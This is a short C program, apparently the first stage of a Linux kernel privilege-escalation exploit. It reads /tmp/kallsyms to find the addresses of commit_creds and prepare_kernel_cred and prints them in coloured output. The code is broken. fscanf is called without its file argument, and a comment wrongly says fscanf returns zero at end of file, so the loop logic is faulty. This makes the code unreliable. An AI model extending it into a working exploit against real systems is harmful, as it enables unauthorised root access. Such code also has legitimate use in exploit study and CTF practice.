#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>

unsigned long long commit_creds = 0, prepare_kernel_cred = 0;	// address of to key function

void get_function_address();

// This function is used to get the addresses of two key functions from /tmp/kallsyms
void get_function_address(){
	FILE* sym_table = fopen("/tmp/kallsyms", "r");	// including all address of kernel functions
	if(sym_table == NULL){
		printf("\033[31m\033[1m[x] Error: Cannot open file \"/tmp/kallsyms\"\n\033[0m");
		exit(1);
	}
	unsigned long long addr = 0;
	char type[0x10];
	char func_name[0x100];
	// when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.
	while(fscanf("%llx%s%s", &addr, type, func_name)){
		if(commit_creds && prepare_kernel_cred)		// two addresses of key functions are all found, return directly.
			return;
		if(!strcmp(func_name, "commit_creds")){		// function "commit_creds" found
			commit_creds = addr;
			printf("\033[32m\033[1m[+] Note: Address of function \"commit_creds\" found: \033[0m%#llx\n", commit_creds);
		}else if(!strcmp(func_name, "prepare_kernel_cred")){
			prepare_kernel_cred = addr;
			printf("\033[32m\033[1m[+] Note: Address of function \"prepare_kernel_cred\" found: \033[0m%#llx\n", prepare_kernel_cred);
		}else{
			printf("\033[33m\033[1m[-] Note: function %s found. \033[0m\n", func_name);
		}
	}
}

int main(){
	get_function_address();
	return 0;
}
